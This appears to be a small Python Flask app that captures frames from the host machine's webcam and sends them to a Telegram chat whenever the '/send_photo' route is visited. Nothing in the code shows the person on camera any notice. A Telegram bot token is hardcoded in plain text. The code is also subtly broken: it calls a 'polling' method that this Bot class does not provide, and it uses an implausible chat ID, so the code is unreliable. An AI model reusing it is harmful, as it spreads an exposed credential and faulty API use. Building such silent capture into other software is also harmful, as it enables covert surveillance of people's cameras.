import cv2
import os
import atexit
from flask import Flask, render_template
from telegram import Bot
from threading import Thread

app = Flask(__name__)
bot = Bot('5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg')
chat_id = 'localipy'
camera = cv2.VideoCapture(0)


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/send_photo')
def send_photo():
    ret, frame = camera.read()
    if ret:
        temp_image_path = 'temp_image.jpg'
        cv2.imwrite(temp_image_path, frame)

        with open(temp_image_path, 'rb') as photo:
            bot.send_photo(chat_id=chat_id, photo=photo)

    return ''


def cleanup():
    camera.release()
    cv2.destroyAllWindows()
    temp_image_path = 'temp_image.jpg'
    os.remove(temp_image_path)


if __name__ == '__main__':
    atexit.register(cleanup)
    flask_thread = Thread(target=app.run)
    bot_thread = Thread(target=bot.polling)

    flask_thread.start()
    bot_thread.start()
